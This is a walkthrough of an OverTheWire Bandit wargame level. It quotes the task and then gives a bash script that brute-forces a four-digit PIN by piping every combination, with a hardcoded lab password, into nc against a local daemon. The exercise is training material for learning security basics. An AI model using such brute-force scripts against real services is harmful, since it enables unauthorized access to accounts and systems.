A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

In this level we will try to bruteforce a 4 digit pincode that goes through 0000 to 9999 in the daemon that is listening on port 30002
To solve this we will use a script that creates all the combinations and pipe it into the nc since it says that we can try multiple lines at a time

mktemp -d
vim /tmp/tmp.iNVisC4Lmx/bruteforce.sh

#!/bin/bash

for i in {0..9999}; do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done | nc localhost 30002

chmod u+x /tmp/tmp.iNVisC4Lmx/bruteforce.sh
/tmp/tmp.iNVisC4Lmx/bruteforce.sh
